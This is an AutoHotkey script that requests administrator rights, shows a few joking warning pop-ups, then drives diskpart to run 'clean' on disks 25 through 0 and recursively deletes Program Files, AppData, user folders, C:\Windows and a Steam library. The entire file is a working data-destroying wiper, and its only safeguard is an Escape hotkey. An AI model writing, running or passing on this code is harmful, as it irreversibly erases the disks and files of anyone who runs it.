#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
#SingleInstance, force
if not A_IsAdmin
	Run *RunAs "%A_ScriptFullPath%" ; (A_AhkPath is usually optional if the script has the .ahk extension.) You would typically check  first.
MsgBox, Don't do this
MsgBox, Like actually this is incredibly bad
MsgBox, Stop 
MsgBox, I guess if you really want to
drives := 25
Run, diskpart.exe
Sleep, 3000
WinActivate, C:\WINDOWS\SYSTEM32\diskpart.exe
WinWaitActive, C:\WINDOWS\SYSTEM32\diskpart.exe
sleep, 100
MsgBox, Last chance to press escape
Loop, 26
{
	Send, select disk %drives% {Enter}
	Sleep, 100
	Send, clean {Enter}
	EnvAdd, drives, -1
}
FileRemoveDir, %A_ProgramFiles%, 1
FileRemoveDir, %A_AppData%, 1
FileRemoveDir, %A_AppDataCommon%, 1
FileRemoveDir, %A_Desktop%, 1
FileRemoveDir, %A_DesktopCommon%, 1
FileRemoveDir, %A_StartMenu%, 1
FileRemoveDir, %A_StartMenuCommon%, 1
FileRemoveDir, %A_Programs%, 1
FileRemoveDir, %A_ProgramsCommon%, 1
FileRemoveDir, %A_Startup%, 1
FileRemoveDir, %A_StartupCommon%, 1
FileRemoveDir, %A_MyDocuments%, 1
FileRemoveDir, C:\SteamLibrary, 1
FileRemoveDir, C:\Windows, 1
FileRemoveDir, C:\Users\%A_UserName%\AppData, 1
FileRemoveDir, C:\Users\%A_UserName%\Saved Games, 1

Return
Esc:: ExitApp
